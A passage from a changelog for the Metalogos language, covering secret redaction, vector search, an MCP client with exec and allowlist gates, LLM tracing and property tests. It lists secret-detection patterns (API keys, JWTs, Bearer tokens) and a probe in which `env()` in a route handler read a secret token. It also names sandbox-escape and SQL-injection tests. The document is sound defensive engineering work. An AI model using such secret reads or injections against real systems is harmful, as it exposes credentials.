- language: `redact(text, mode) -> String` (arity 2, category `string`) — deterministic typed masking and the ONLY legal path to clear the `Secret` taint statically («mask before sink», owner decision SG-2 2026-09-12). mode: `"pii"` (email `***@***.tld`, phones `+`/RU-8 formats (7..15 digits), Luhn-validated cards with vendor label, IBAN), `"secrets"` (sk-/AKIA/ghp_-style keys, JWT, PEM blocks, Bearer tokens) and `"all"`; the entropy net (base64/hex runs ≥24 containing a digit AND a hex letter) backs both secret-bearing modes against formats outside the pattern set. Masks keep type + last 4 chars (`[REDACTED:sk-…abc4]`) so logs stay diagnosable; masks are idempotent. Loud unknown mode; accepts `Value::String` and `Value::Secret` (result is a plain `Value::String`).
- taint (ADR-0136 D2): `"secrets"/"all"` clear ONLY `Secret` → `Sanitized`; `"pii"` does NOT clear `Secret` (`secret → redact("pii") → http_post` is rejected); `LlmOutput` is never cleared by redact (only `render` sanitizes model output — `HTML_INJECTION` stays); non-literal mode is fail-closed (taint inherited). Implemented statically in `src/audit.rs` (`redact_result_taint`), applied uniformly for let-chains and inline calls.
- tests: `tests/naryad_274_redact.rs` (34): every pattern class positive+negative ("skating" is not an sk- key; Luhn-fail digits unmasked), determinism + idempotence corpus, loud unknown mode, language-level run incl. `secret()` input, the DoD pair (`secret → respond` rejected vs `secret → redact("secrets") → respond` passing) with the third SG-2 invariant (`redact("pii")` rejected) and the http_post-body positional pair, LLM-output non-clearing, dynamic-mode fail-closed, arity pin, and a 20k-input deterministic fuzz smoke (panic-freedom/determinism/idempotence). Fuzz target `fuzz_target_redact` added (convention №256); fuzz-smoke CI wiring lands with the owner's workflow patch (PAT without workflow scope, precedent №272).
- docs: ADR-0136 (Accepted, SG-2), threat-model SECRET_LEAK mitigation row with honest limits, REFERENCE §4 row + regenerated §6 (398 → 399 builtins), README counts synced.


### Added — language: `cache_semantic` + the ADR-0047 LRU cache boundary (Naryad #273, ADR-0135)

- language: two learnable-pattern fields: `cache_semantic: true` (opt-in, default false — ADR-0047-compatible) and `cache_threshold: 0.92` (default, parser-validated (0, 1]). Check order preserved: few-shot → exact hash → semantic → LLM. On an exact-hash miss the input is embedded (SSOT manager of the `embed` builtin, №272) and scanned by cosine against the lazy SQLite table `llm_cache_semantic` (response + embedding + dim + ttl); similarity ≥ threshold returns the cached response; a miss stores both. Anti-false-hit: high default threshold, opt-in, dim mismatch → cosine 0.0. Loud boundaries: without persist (`memory { persist: ... }`) or without the `vec` feature the semantic mode is a loud config error — in-memory vectors are deliberately not kept. Observability: `llm_usage()` gains `cache_hits_semantic` (exact hits stay separate) and the №276 traces record `cache: "semantic"`. Full-scan cosine, not vec0 (cache-scale tables; ADR-0135 D3).
- cache: the in-memory cache is bounded by LRU — `METALOGOS_LLM_CACHE_MAX` (default 1000, invalid → stderr warning + default), eviction by recency of USE; closes the "grows without bound" negative in ADR-0047 (reference in its Consequences). The SQLite `llm_cache` surface is unchanged.
- tests: `tests/naryad_273_semantic_cache.rs` (7, gated): exact-hit priority (semantic counter unchanged), paraphrase hit with a mock provider (1 LLM call, counter +1), miss below threshold (0.99), TTL expiring entries, LRU eviction (MAX=2 → evicted entry re-calls), no-persist loud refusal, exact contract C1 intact. Honest boundary: precise 0.919/0.921 thresholds are irreproducible against TF-IDF IDF drift — the hit ⟺ sim ≥ threshold contract is covered by the low-threshold-hit / 0.99-miss pair (ADR-0135 D3).
- docs: REFERENCE §5.2 + `llm_usage` rows + trace `cache` values; ADR-0047 Consequences reference; ADR-0135; ADR index.

### Added — language: `embed` / `vec_store` / `vec_search` — the vector contour over sqlite-vec (Naryad #272, ADR-0134)

- language: three new `memory`-category builtins behind the off-by-default feature `vec` (in `portable` per ADR-0134 D3). `embed(text) -> List[Float]` lifts the ADR-0040 `EmbeddingManager` to language level with NO new dependencies: default deterministic TF-IDF (`dim = max(vocab, 256)`, process-global SSOT (vectors of different calls comparable); IDF/dim drift documented), OpenAI `text-embedding-3-small` (1536) via `METALOGOS_EMBEDDING_PROVIDER=openai`. `vec_store(db_path, table, id, embedding) -> Struct{stored, table, id, dim, rowid}` and `vec_search(db_path, table, query, k) -> List[Struct{id, distance}]` are generic KNN builtins over sqlite-vec `vec0` tables (metadata column `id` returned by KNN without a join, `WHERE`-filterable for Phase 4). Dimension is fixed per table in `vec_meta`; mismatches are LOUD errors naming both numbers (the anti-model-mixing guard). `db_path` goes through the file sandbox (`sandbox_path_ex`, №131/№252); table names pass an SQL identifier whitelist; `k <= 0`, non-integer `k`, `k > 10000` are loud errors. Names are domain-agnostic (FEATURE_INTAKE §4-D) — Phase 4 consumes them as a foundation, out of scope here.
- tests: `tests/naryad_272_vec_search.rs` (feature-gated, 9 tests): roundtrip with top-1 verified, KNN order, empty table → empty List, dimension mismatch loud on store AND search, sandbox escapes + SQL-injection-via-table-name refusals, k limits, missing table loud, arity pins, and the DoD example — the chain byte-identical across TW and VM. CI: `test-integration` now runs with `--features vec` (the gate stays honest: `minimal-build`/`test-lib` run WITHOUT it; without `vec` the build and the existing suite stay green — lib 640/640 locally).
- docs: REFERENCE §4.23 + regenerated §6 (395 → 398 builtins); README counts synced (398 builtins, 136 test files); ADR-0134 Finalization section.

### Added — docs: sqlite-vec spike №271 — Go verdict (ADR-0134)

- docs: new `docs/research/naryad-271-sqlite-vec-spike.md` + ADR-0134 — the sqlite-vec spike (issue #307; verdict-gate resolved by the executor per dispatch #316 mechanics). Facts: integration contract verified on rusqlite 0.40 bundled WITHOUT `load_extension` (static registration via `sqlite3_auto_extension`); vec0 `distance_metric=cosine` top-1 verified against the full scalar scan at 1K/10K/100K; binary delta 0.15 MB measured on a probe crate with real usage; KNN 10K×384 k=10 = 4.41 ms vs 8.78 ms for the current decode+scan path (~2×; vec0 is also brute-force — SIMD + in-DB scan, not ANN — stated honestly), insert ~81–84K vec/s; Linux verified locally, macOS/Windows via the spike-branch CI jobs (`--features portable --all-targets`); wasm: browser path No-Go through rusqlite (consistent with №278), wasip1 path exists behind wasi-sdk, sqlite-vec itself ships a wasm build for the Go-path Playground. All proposed Go criteria PASS with margin (0.15 MB < 2 MB; 4.4 ms < 50 ms; 3 OS clean) — №272 (embed / vec_store / vec_search) proceeds on sqlite-vec. Spike artifacts (criterion bench, smoke test, temporary `vec` in portable) remain on the spike branch only and are NOT merged; this PR carries the documents.

### Added — docs: live `mcp_call` security-gate walkthrough in README (Naryad #270 tail, dispatch #316)

- docs: README §2 "Security by Design" now shows the MCP client gates with a live transcript verified against the fixture server shipped with the test suite (`tests/fixtures/mcp_echo_server.py`): default deny (`EXEC_NOT_PERMITTED` before any server is spawned), allowlist refusal (`METALOGOS_MCP_ALLOWLIST="uvx"` → `MCP_NOT_ALLOWLISTED`), the success path (`echo: hi`), and the static half — `reflex_train` on `mcp_call` output is a compile-time refusal (`UNTRUSTED_TRAINING_DATA`, the model-poisoning sink). The stale "MCP-native" pitch line ("the design is under owner review as of this release, the client implementation lands in naryad №268") now reflects the shipped state. Closes the last open checkbox of dispatch #316 wave 2.

### Added — build: `tokio` optional behind `server` — dependency-graph hygiene measured for the wasm spike (Naryad #278)

- build: `tokio` was a hard dependency (`features = ["full"]`, non-optional) while the use-graph shows it is needed ONLY by the server stack: `src/server.rs` (already fully `#[cfg(feature = "server")]`) and `cmd_serve` in `src/main.rs` (already cfg'd, including the one `tokio::runtime::Builder`). Now `tokio` is `optional = true` behind `server = [..., "dep:tokio"]` — the first wasm-spike step (№278), valuable on its own: the core (parser/compiler/VM) and the `mlog` binary build without the server stack (the blocking `minimal-build` CI job now verifies this on every PR). Numbers: normal dependency graph unchanged at 357 crates with default features; without server 339 crates (−18: axum/axum-core/axum-macros, matchit, http-body-util, serde_path_to_error, serde_urlencoded, tower-http, tokio-macros, tokio-util, h2, parking_lot(+core), lock_api, signal-hook-registry, errno, fnv); clean debug `cargo build --lib` 153 s → 140 s (−13 s, ~8.5 %, same-container measurement). Honest boundary: tokio itself REMAINS in the no-server graph via `reqwest → hyper → tokio` (async client under llm/http/voice builtins) — full removal requires the reqwest feature surgery planned in docs/research/naryad-278-wasm-spike.md.
- docs: new `docs/research/naryad-278-wasm-spike.md` — the wasm reconnaissance report: target graph under `wasm32-unknown-unknown` (303 crates with no default features), the observed first hard stop (`openssl-sys` build script), the full wasm-incompatible blocker families (openssl/native-tls ← imap+lettre; reqwest+hyper+tokio; rusqlite/libsqlite3-sys; getrandom wasm_js requirement; socket2/libc networking), what IS pure (pest parser, compiler, VM, pure builtins), the **No-Go verdict** for the Playground in current form, and the Go-path plan (dependency surgery: imap+lettre→`email`, reqwest→`http`, rusqlite→`memory` features; then wasm check → cdylib → <5 MB gz criterion → GitHub Pages demo).

### Fixed — language: `strip()` panic when both ends meet (found by proptest, Naryad #277)

- language: `strip(s, chars)` counted the two ends independently — when the whole string consisted of strip-chars (e.g. `strip("&", "Ⱥ&")`), `start > len - end` and the char-slice PANICKED (`slice index starts at 1 but ends at 0`) instead of returning an empty string. Found immediately by the new no-panic property sweep (registry-driven, random unicode args); fixed with the `trim_matches` contract (both ends consuming everything → empty), the proptest minimizer and ordinary shapes pinned by `regression_strip_overlap_ends_no_panic`.

### Added — testing: property-based tests (proptest) + cargo-mutants smoke + Testing Evidence (Naryad #277)

- testing: the language had a fuzz contour (№256) but ZERO property-based tests and no mutational data (grep proptest/cargo-mutants — 0) — for grant applications (NLnet/Restack Testing Evidence) property-properties and mut-score are strong, easily verifiable quality proof. Four deterministic proptest suites in blocking CI: (1) `tests/property_builtin_nopanic.rs` — the registry (`BUILTIN_REGISTRY`) is enumerated AT RUNTIME and every PURE builtin is called with random/boundary `Value` arguments (unicode, deep nesting, float edges): value or loud error, NEVER a panic — 162 pure builtins covered directly (stubs counted-and-skipped honestly; side-effectful categories bot/web/io/email/llm/db/voice/... excluded with the full list printed by the test); (2) `tests/property_json_roundtrip.rs` — json_encode validity + canonical stability + json_get path navigation returning exactly the placed leaves (256 cases × 3 properties); (3) `tests/property_string_invariants.rs` — reverse∘reverse=id on arbitrary unicode, len==chars-count, substring/char_at as char slices at every boundary, escape_html without raw angle brackets (512 cases × 4 properties); (4) `tests/property_tw_vm_parity.rs` — programs GENERATED from a conservative grammar subset (literals/arithmetic/concat/lets/builtins/pattern-calls) execute IDENTICALLY on TW and VM, with the ADR-0105 exclusions (`match`, `BlockIfElse`-as-value, memory/server/IO) listed explicitly — parity is not claimed where the ADR documents divergence. Every crash the properties found was fixed (`strip`, see Fixed above) — nothing silenced.
- ci: new `.github/workflows/mutants.yml` — cargo-mutants smoke over `src/builtins/json.rs` (dense escaping/parsing/navigation logic; killer = the json roundtrip property), weekly schedule + workflow_dispatch, explicitly NON-blocking and NOT in the PR run (scheduled runs create no PR check-runs — the blocking count stays 15, the fuzz-smoke №256 principle); mut-score (killed/(killed+missed+timeouts)) computed and published as an artifact each run for the trend. Documented deviation from the issue's module candidates: `src/audit.rs` (3232 lines) and `src/builtins/string.rs` (905 lines) would make the weekly run multi-hour without adding smoke value — the choice is recorded in the workflow header and docs/testing-evidence.md.
- docs: new `docs/testing-evidence.md` — the grant-facing numbers page (162 pure builtins no-panic, property counts, mutants smoke design, fuzz contour, blocking CI composition) + the honest boundaries (excluded categories, ADR-0105 subset, the json float 1-ulp printing observation documented as behavior, not changed).

### Added — language: `tts_generate` — speech synthesis without delivery; whisper_transcribe arity fact-check fix (Naryad #279)

- language: the voice contour was delivery-shaped: `tts_send(text, voice, bot_token, chat_id, mode?)` synthesized AND shipped to Telegram in one step (FEATURE_INTAKE §4-D Tier-3 form in Tier-1 code — the builtin was named after a delivery service), so the audio file itself was unreachable — no save, no reuse, no alternative transport. New `tts_generate(text, voice, provider?, model?) -> String(path)` (arity 2..4): synthesis ONLY — writes the audio into the file sandbox with the exact write_file semantics (Naryad #252: sandbox-resolve + symlink-safe open) and returns the sandbox-relative path (MP3, provider default format; the language's delivery layer is now the program's decision — read_file, send_document, or whatever comes next). Providers v1: `"openai"`; the model is a plain argument (`tts-1` default / `tts-1-hd` / `gpt-4o-mini-tts`) — the previous `tts-1` hardcode is gone from the synthesis path. Key: `METALOGOS_TTS_API_KEY` (falls back to `OPENAI_API_KEY` — variable name is open, not hardcoded); `METALOGOS_TTS_BASE_URL` overrides `https://api.openai.com/v1` (`/audio/speech` appended) for mock servers and self-host proxies. `tts_send` stays (backward compatible) as the documented delivery convenience: it now DELEGATES synthesis to the same shared exchange (`tts_synth`), so delivery and synthesis cannot drift.
- bugfix (the fact-check the naryad mandated): `whisper_transcribe` declared `spec!(..., 1, ...)` while the implementation has ALWAYS required THREE string args (`file_id`, `bot_token`, `whisper_key`) plus optional `provider` — per ADR-0095 the single digit meant minimum, so `mlog check` passed 1-arg calls that exploded at runtime with an arity/args error. Registry fixed to 3..4 (AGENTS.md §1: check_builtin_arity semantics verified before the fix; REFERENCE already documented the real 4-arg shape — the registry was the liar). STT symmetry: `METALOGOS_STT_BASE_URL` overrides the transcription base for both providers (same convention as the TTS override).
- tests: 4 in `tests/naryad_279_voice.rs` — mock TTS server (loop-accept, reads full headers+Content-Length) loud-verifies the Authorization header carries the METALOGOS_TTS_API_KEY key and the JSON body carries model/voice, then serves fixed bytes: TW and VM both produce a sandbox file with byte-for-byte content and a sandbox-relative path (crosscheck contract); missing key → loud error naming `METALOGOS_TTS_API_KEY` (no silent OPENAI fallback when the variable name is what's documented); unknown provider → loud refusal before any HTTP; static arity: `mlog check` REJECTS 1-arg `whisper_transcribe` (the naryad's core bug, now caught on statics) and the registry bounds 3..4 / 2..4 / 4..5 are pinned via check_builtin_arity; `tts_send` with a mocked synthesis but fake Telegram token fails AT DELIVERY — proving delegation (synthesis succeeded, bytes were consumed by the send step). Honest boundary: whisper end-to-end is not integration-tested (the function's first step is a real api.telegram.org call; the STT override is code-symmetric with the TTS one).

### Added — observability: per-call LLM traces in JSONL with OpenTelemetry GenAI field names (Naryad #276, ADR-0138)

- observability: LLM usage was aggregate-only (`llm_usage()` totals/per-provider health) — there was no per-call record, so "which call was slow, expensive, or failed for which model" was unanswerable, and FOSVED's contour (B2) has no token/cost/latency stream for routing (FOIP-003) and the darwin cycle (FOIP-002). New env `METALOGOS_LLM_TRACE=<path>`: every LLM call appends ONE JSONL line — metadata only (no prompt/response content, safe to ship to centralized logging). Field names follow the OTel GenAI semantic conventions VERIFIED against the live spec (semantic-conventions-genai `docs/gen-ai/gen-ai-spans.md`, base v1.44.0, checked 2026-09-12) — with one documented deviation from the issue text: the issue said `gen_ai.system`, but the upstream spec RENAMED that attribute; the live name `gen_ai.provider.name` is used, because the whole point is a future exporter reading the file WITHOUT renames. Zero new dependencies; OTLP export stays Tier 3.
- design (ADR-0138): single instrumentation point per actual invocation — `SmartRouter::call` (success traces the winning provider + usage; exhaustion traces the LAST attempted provider; no double-tracing with builtin fallbacks), `call_claude` (refactored into trace-at-single-exit + HTTP impl; argument-type errors are not traced — no request reached a provider), non-router fallbacks of `call_llm`/`call_llm_schema` (schema retries trace per retry — each retry IS one call), legacy backend call sites that bypass builtins entirely (found by auditing every `create_llm_backend()` site: TW/VM learnable evaluators, conversation summaries, `human_respond` — an untraced direct call would be a silent observability hole), ADR-0047 cache hits trace `cache:"exact"` with lookup latency. Honest data: absent provider fields are OMITTED, never invented (mock/legacy carry no usage; usage is extracted best-effort from raw provider responses — OpenAI `prompt_tokens`/`completion_tokens`, Anthropic `input_tokens`/`output_tokens`, Ollama `prompt_eval_count`/`eval_count`). `backend` field distinguishes `"tw"`/`"vm"` via a thread-local tag set-and-restored by VM entry points (`Vm::run`, `execute_route_code`) — restore-on-exit because pooled threads would leak the tag onto the next program.
- reliability: append+flush per line (crash loses nothing written — documented speed-for-survivability trade); trace-write errors NEVER fail the LLM call (one stderr warning, then silence for the process); overhead when off = exactly one env-check per call; no rotation in v1 — the file grows, the operator rotates it (documented, not silent).
- tests: 6 in `tests/naryad_276_trace.rs` — enabled (one call → one valid JSONL line with exact semconv names and status/cache/backend/ts; usage/model fields asserted ABSENT for the mock — honest data), off-by-default (env unset → no trace; enabling mid-process takes effect immediately), broken path (calls still succeed, nothing written), SmartRouter path against a real HTTP mock (provider/alias/model/usage fields from an OpenAI-format response with a usage block), cache hit (`miss` → `exact` with `MockLlm::call_count` pinned at 1), backend tags (same program via TW → `"tw"`, via VM → `"vm"`).

### Added — language: `mcp_call` / `mcp_list_tools` — MCP stdio client with language-level security control (Naryad #268, ADR-0132)

- language: Metalogos could not talk to the Model Context Protocol — the main integration standard for AI agents — at all; `tool` (ADR-0054), exec-gates (№253-A) and taint existed, but no bridge. Two new builtins implement the client per ADR-0132 (Accepted by owner 2026-09-12): `mcp_call(command, args_list, tool, arguments_json) -> String` and `mcp_list_tools(command, args_list) -> List[Struct{name, description, input_schema}]`. Stateless lifecycle per call: spawn → legacy `initialize` handshake → `tools/call`/`tools/list` → shutdown (D4: one call = one exec-gate = one audit record). Manual newline-delimited JSON-RPC 2.0 over `std::process` (D1/D2): 0 new dependencies; the official `rmcp` SDK was rejected — 9 new crates exceeds the hard limit of 5 (FEATURE_INTAKE §5) and its tokio-async core fights the blocking-builtin runtime (ADR-0096). Legacy dialect (client declares protocolVersion 2025-03-26, accepts replies 2024-11-05…2025-11-25); modern-only servers, tools/list pagination (`nextCursor`) and `structuredContent` are loud refusals, never silence.
- security (the grant edge): spawn goes through the №253-A SSOT exec-gate (`METALOGOS_ALLOW_EXEC` in process contexts, `METALOGOS_SERVE_ALLOW_EXEC` in route bodies — replacement, not AND; refusal `EXEC_NOT_PERMITTED`) plus the third Metalogos allowlist `METALOGOS_MCP_ALLOWLIST` (comma-separated with trim/empty-element convention of №259, exact argv[0] match; unset does not narrow, an empty value denies all MCP, otherwise refusal `MCP_NOT_ALLOWLISTED` per ADR-0131). Every permitted spawn is recorded in `METALOGOS_AUDIT_LOG_PATH` (same channel as `exec()`). Tool OUTPUT is untrusted: the `mcp_call` result carries `TaintKind::UserInput` (owner decision — reuse; a new `ToolOutput` kind stays Future until a policy actually differentiates kinds), so `reflex_train` on MCP output is statically rejected with `UNTRUSTED_TRAINING_DATA` — model poisoning via an MCP tool is impossible from day one. The policy is exactly equal to `json_body` (pinned by a parity test — neither wider, nor narrower). Tool METADATA (names/descriptions/inputSchema) is untainted; including descriptions in LLM context is the program's explicit decision (prompt-injection surface documented in threat-model). Children inherit the interpreter environment — the same contract as `exec()`/`exec_argv()` (№259's env-gate governs `env()` reads in route bodies, not child inheritance).
- reliability: per-phase timeout `METALOGOS_MCP_TIMEOUT_SECS` (default 30, clamp 1..=300); Drop-guaranteed shutdown (close stdin → 500 ms grace → kill) leaves no orphan MCP processes on any exit path including `?`-returns and panics; loud phase errors `MCP_SPAWN_FAILED` / `MCP_TIMEOUT` / `MCP_IO_ERROR` / `MCP_PROTOCOL_ERROR` / `MCP_TOOL_NOT_FOUND` (JSON-RPC -32602 on tools/call) / `MCP_TOOL_ERROR` (`isError=true` with the server's text); server JSON-RPC error codes propagate into messages.
- tests: 21 in `tests/naryad_268_mcp_client.rs` against a fixture stdio server `tests/fixtures/mcp_echo_server.py` (p71/p76 convention): TW/VM parity contracts (tools/list → Struct → json_get; tools/call → String), every loud error path (tool-not-found, isError, -32603, phase timeout, garbage-on-stdout framing violation, crashed-server broken stream), gates (exec process + serve-route on BOTH backends, allowlist unset/empty/exact-match/trim), taint parity with json_body, audit-log record shape. Golden example `examples/p100_mcp_echo.mlog` (`.expected` = `echo: mlog calls MCP`) runs TW==VM in crosscheck. REFERENCE §4 io rows + regenerated §6 (394), threat-model untrusted-entity line, README counters updated.

### Fixed — ci: platform advisory jobs (macos/windows) red on every run since `pdf-ocr` (CI-hygiene)

- ci: `windows-check`/`macos-check` ran `cargo check --workspace --all-features --all-targets`, but the optional `pdf-ocr` feature requires system tesseract-ocr + leptonica C libraries (documented in Cargo.toml), which GitHub-hosted macos/windows runners do not have — the `leptonica-sys` build script panicked on both platforms, so every CI run (main and PRs) showed red X marks even when all 15 blocking checks were green. Replaced with `--features portable`: new Cargo.toml meta-feature `portable = ["full", "candle", "vision"]` — the maximal portable set (everything except the platform-dependent `pdf-ocr`). House rule added next to the feature block: a new feature must join `portable` or document its platform exclusion right there. No code changes; the ubuntu blocking set is unchanged (it never used `--all-features`).

### Added — docs: REFERENCE.md at 100% registry coverage — generated index, hard CI gate, grant-review README (Naryad #270)

- docs: `REFERENCE.md` documented ~59% of the builtins registered in `BUILTIN_REGISTRY` (231 of 391 at snapshot; AGENTS.md §5 said so out loud) — for grant reviewers (NLnet/Restack) an incomplete reference reads as project immaturity, and NOTHING failed CI when builtins were added undocumented (the coverage note even drifted: it claimed 230 documented while the count test allowed it). New `scripts/gen_reference.py` regenerates a §6 Builtin Index between explicit markers IN PLACE: one row per `spec!` entry (392 at merge), name/category/arity straight from the registry (ADR-0095 arity convention, `variadic` for the 0-arity form), description imported from the curated §4.x rows when present, otherwise from the handler's `///` doc comment, otherwise an explicit `TODO(doc)` — never silence. Registry entries with no host handler are described from a verified MANUAL_DESCRIPTIONS table in the script: VM-native builtins (recall/forget/find/conv_*/event_*/query_*/resolve_skill_index/fit_to_budget — dispatched inside `src/vm.rs`, registry arity entry kept for bytecode validation) vs true registry-only stubs (newline/stdin/split_tokens/if_eq/is_string_token — no handler anywhere, calling errors; the stale "planned, no handler" comment next to event_* is corrected in place). The generated block is excluded from the curated-row extraction so regeneration cannot feed on itself. 100% at merge: every description exists (curated 210 + handler-doc 137 + manual 21 + 24 handlers gained real `///` docs in source — string/math/crypto/http/svg/chart/diagram handlers, improving the code itself).
- tests: new `tests/reference_consistency.rs` (3 tests) — the hard gate: every registered builtin must appear in REFERENCE.md as `` `name(` `` (mention-style, the `gen_reference_check.py` rule made blocking); the §6 generated block markers must exist and the headline must match the registry size exactly; zero `TODO(doc)` rows may remain in the block. Adding an undocumented builtin now fails CI instead of silently rotting the docs.
- README (grant-review pass, honest-claims discipline): new "Why Metalogos" section — a 30-second pair of live-verified probes (`call_llm_schema` → `json_get` Struct access; `env()` → `respond()` refused with the exact `mlog check` output and exit 1 — both run against the built binary before being pasted), then three pillars: Security by design (taint/sandbox/gates with a pointer to the honest "what static analysis does NOT catch" table), AI-native (eight semantic primitives), MCP-native (honest status: ADR-0132 design under owner review, client lands in №268, reverse bridge per ADR-0054 — no overclaiming). Stale numbers fixed against reality: "373 Built-in Functions" heading → 392, VM "46 instructions" → 47 (counted from `Instruction` enum), REFERENCE size ~84 KB → ~152 KB (with the §6 index note). No crates.io badge added — the crate is not published; a badge would be a lie.
- docs: `scripts/gen_reference.py --check` mode (exit 1 on staleness) is available for local/CI use; the Rust gate is the blocking enforcement.

### Added — language: `call_llm_schema` — structured LLM output with a schema validator, retries, and loud diagnostics (Naryad #269, ADR-0133)

- language: `call_llm(prompt, input)` returned raw text, and the language had no way to ASK an LLM for structured data — programs concatenated format instructions into the prompt and hoped; every format deviation silently flowed downstream as a garbage String (the exact pain class FOSVED's llm_verifier hand-scrapes). New builtin `call_llm_schema(prompt, schema_json)` / `call_llm_schema(prompt, input, schema_json)` (arity 2–3, feature `llm`): the system directive "answer with ONLY a JSON value per this schema" is appended to the prompt, the answer is parsed strictly, validated, and returned as a `Value::Struct` (type_name `Dict` — `json_get`/`has_field`/`dict_*` interoperate for free; number fields arrive as `Float`, the only numeric runtime type). Validator subset (ADR-0133 D1): `type` (object/array/string/number/integer/boolean/null), `properties`, `required`, `items`, `enum`; pure-annotation keywords (`$schema`/`title`/`description`/`default`/`examples`/`$id`/`$comment`) are ignored — inert metadata cannot weaken validation; ANY other keyword is a loud `[LLM_SCHEMA_UNSUPPORTED_FEATURE]` naming the keyword (the naryad's "explicit error" option: a silently ignored `pattern` would mean the author believes validation is stronger than it is). Root schema must be `{"type":"object"}`. Documented deviation from JSON-Schema defaults (D2): answer fields beyond `properties` are violations (strict-by-default — unvalidated keys must not smuggle LLM-derived data into the Struct; makes the unsupported `additionalProperties` redundant). Answer-side failures are loud `[LLM_SCHEMA_MISMATCH]` and RETRY (D3): `METALOGOS_LLM_SCHEMA_RETRIES` (default 2, hard cap 10) extra attempts, each carrying the FULL validator report (all violations, not fail-fast) back into the prompt; unparseable JSON reports max_tokens truncation as the likely cause (call_claude's hardcoded 4096 makes this a real shape). Schema-side errors and transport errors never retry (retrying cannot fix the program's own schema; SmartRouter ADR-0048 owns failover — a second layer would double-call dead providers). Mock tier (D4): with no SmartRouter, any mock setting (unset default / true / 1 / json) yields a deterministic minimal instance DERIVED FROM THE SCHEMA (enums → first literal; strings → their key name) flowing through the real parse→validate→convert pipeline — the mlog contract is testable without network, and a `[MOCK: ...]` text (a guaranteed loud failure) helps nobody. Result binding carries `LlmOutput` taint (audit.rs) — structured or not, the content is LLM-derived. No new dependencies (schemars/valico rejected per FEATURE_INTAKE §4-C; the ~300-line validator is the ADR-recorded exceedance of the <200-line guideline, own module `src/builtins/llm_schema.rs`). Known boundary, pinned by tests and ADR: modern JSON-Schema composition (`allOf`/`pattern`/`format`/numeric bounds/refs) fails loudly at schema-check time BEFORE any LLM call is paid for. Tests: 24 in `tests/naryad_269_schema.rs` — the contract `call_llm_schema → Struct → json_get` green on TW and VM (flat, nested object, array-index and integer paths, `mlog check` clean); every supported/ignored/rejected construct; retry loop with scripted providers (fail-once-then-valid, no-budget loud mismatch with attempt bookkeeping, truncation hint, schema-side zero provider calls, transport error propagation, feedback-in-prompt); mock self-validation; retries env defaults/cap. `registry_arity_check` gains the `(2,3)` case; REFERENCE §4.5 documents the builtin and the mock contract.

### Added — language: `memorize`/`relate`/`forget` as statements inside pattern/route/hook/tool/test bodies (Naryad #266 — silent token soup excluded)

- language: inside a pattern/route body the statement grammar had NO memory arms, so `memorize fact with priority=0.8` silently split into FOUR garbage statements (`Ident("memorize")`, `Ident("fact")`, `Ident("with")`, `Assign{name: "priority"}`) — `mlog check` let the soup through until №264's static immutability check tripped on the `priority` assign, the tree-walking interpreter failed at the FIRST pattern invocation with `error: undefined variable: memorize` (exit 1), and the VM skipped the equivalent opcodes SILENTLY (`execute_code`'s `_ => ip += 1`). Contract 3 of `examples/p8_route_patterns.mlog` ("pattern with memory from route") never worked end-to-end — it only ever compiled (issue #290; surfaced by №264, issue #280). Fixed by SUPPORT, not by a loud ban (variant 1, chosen and recorded in PR): the runtime already had the whole mechanism — TW executes top-level `memorize`/`forget`/`relate` as actions in `run()`, the VM already had the `Memorize`/`Forget`/`Relate` opcodes, and no extra session context is required — so the statement form was pure plumbing and a parse-error ban would have permanently hidden working semantics. Grammar: `statement` now references the EXACT same `memorize_decl`/`relate_decl`/`forget_decl` rules as the top-level declaration alternation (single grammar source), placed before `assign_or_expr` — PEG ordered choice with backtracking keeps `memorize = 5`, `forget(x)`, and parameters named `memorize` parsing exactly as before (pinned by a regression test). AST: `Statement::Memorize`/`Forget`/`Relate` wrapping the existing declaration payload structs; the parser reuses the same declaration parsers. TW: shared `exec_memorize`/`exec_forget`/`exec_relate` helpers serve both the top-level declarations and the statement arms — the statement form evaluates its value/query expressions in the CALLER's environment (pattern params and locals are visible: `memorize "user said " + fact with priority=0.8`), same stores, same `memory_store` event stream. VM: `execute_code` (the pattern/route-body dispatch loop) received the three missing opcode handlers mirroring `execute_main_code` verbatim (№41 audit parity for `Relate`) — the pre-№266 silent skip was the same dishonest-silence class the naryad excludes. Static passes cover the new statements: SVG/HTML security lint, call/arity/undefined-function checks, and the №264 immutability pass (memory statements never assign). Semantics unchanged at top level (declarations stay declarations, evaluated against globals). The restored example: `examples/p8_route_patterns.mlog` Contract 3 carries `memorize fact with priority=0.8` inside `Remember` again (the №264 truth-up comment replaced by a "works with №266" one). Tests: 10 in `tests/naryad_266_memory_stmt.rs` — the AST probe pins the token soup OUT forever (the body must be exactly `[memorize, return]`); relate/forget statement AST; route + hook bodies accept memory statements; keyword-lookalike regression (`memorize = 5` is still an Assign, `relate = 7.0` still assigns, a `memorize` parameter still works); TW executes the probe end-to-end (`Remember` memorizes, `RecallIt` recalls, flow output `hello` — the pre-№266 answer was the runtime error); VM parity on the SAME source (same `hello`; pre-№266 the VM silently skipped the opcode and recall returned `""`); `forget` statements run on both backends; `mlog check` green (no false positives); top-level `memorize` regression; the restored p8 asserted on disk + end-to-end. REFERENCE §5.15 documents where memory statements are allowed (and the `forget ... after 30.0 days` doc-rot is fixed to the actual grammar: `30.days`).

### Changed — security(io): env() in serve route handlers is gated — ENV_NOT_PERMITTED + allowlist (Naryad #259 — breaking)

- security(io): `env(key)` returned ANY process environment variable in EVERY context with no gate — including serve route bodies, where the code receiving untrusted input could read the process's secrets with one call (`env("FAKE_API_SECRET_TOKEN")` returned `sk-supersecret` on a probe against main; LLM API keys, DB passwords, deploy tokens — external audit 2026-09-11, issue #275). Now `env()` inside serve route bodies is DENIED by default with a loud error carrying the stable diagnostic code `ENV_NOT_PERMITTED` (ADR-0131 naming convention; the code rides in the error text until the mlog-check diagnostic registry lands — same treatment as №253/№254). The gate runs BEFORE the read, so the denial is identical for existing and non-existing names — probing route errors is not an existence oracle. Escape hatches with REPLACING semantics (alternatives, not AND — the №253-A lesson; neither needs nor consults the other): `METALOGOS_SERVE_ALLOW_ENV=1` allows ALL env reads in route bodies, or `METALOGOS_ENV_ALLOWLIST="NAME1,NAME2"` allows exactly the listed names (comma-separated, element edges trimmed, empty elements ignored; an unset/empty list = deny all). Outside serve (`mlog run`, `mlog check`, repl, serve top-level route registration) the behavior is UNCHANGED — a local script reading its own environment is the contract, no flags or allowlist needed. Mechanics: the gate reuses the №253-A SSOT — the same thread-local serve-route context (`ServeRouteExecGuard` set inside the spawn_blocking closures of BOTH route paths, TW and VM) via the new SSOT `env_gate(context, key)` next to `exec_gate` (`src/builtins/io.rs`); no second flag hack. The serve banner lists `METALOGOS_SERVE_ALLOW_ENV=1` and a non-empty 